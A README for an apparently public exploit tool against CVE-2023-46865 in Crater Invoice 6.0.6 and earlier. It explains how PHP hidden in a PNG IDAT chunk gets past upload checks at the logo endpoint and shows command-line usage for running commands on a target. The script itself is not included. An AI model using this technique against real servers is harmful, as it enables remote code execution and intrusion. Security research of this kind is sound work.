# Crater-CVE-2023-46865-RCE
Crater &lt;=6.0.6, CVE-2023-46865 Post-Auth RCE (Superadmin)

## Vulnerability Description

Crater Invoice is vulnerable to unrestricted file upload with dangerous type due to lack of proper input validation. The Base64Mime checking class can be bypassed by embedding a valid PHP payload into an IDAT image chunk. A user with superadmin privileges is able to upload the crafted payload through company logo at /api/v1/company/upload-logo.

## Usage

    $~ usage: python3 crater-rce.py --target TARGET --email EMAIL --password PASSWORD [--cmd CMD]
    $~ python3 crater-rce.py --target http://192.168.1.1 --email test@mail.com --password test1234 --cmd 'whoami'  

    $~ python3 crater-rce.py -h                                                                                                                                                                                       
    usage: crater-rce.py [-h] --target TARGET --email EMAIL --password PASSWORD [--cmd CMD]
    
    Crater Invoice RCE - CVE-2023-46865
    
    options:
      -h, --help           show this help message and exit
      --target TARGET      Target URL
      --email EMAIL        Email
      --password PASSWORD  Password
      --cmd CMD            Command to execute
      
## Tested on

    - Crater 6.0.6
    - Kali 6.1.0
    
## References
https://github.com/huntergregal/PNG-IDAT-Payload-Generator 

https://notes.netbytesec.com/2023/11/post-auth-rce-in-crater.html

## Credit
[faisalfs10x](https://github.com/faisalfs10x) - for helping develop proof of concept.

## Disclaimer:

    The script is for security analysis and research only, hence I would not be liable if it is been used for illicit activities
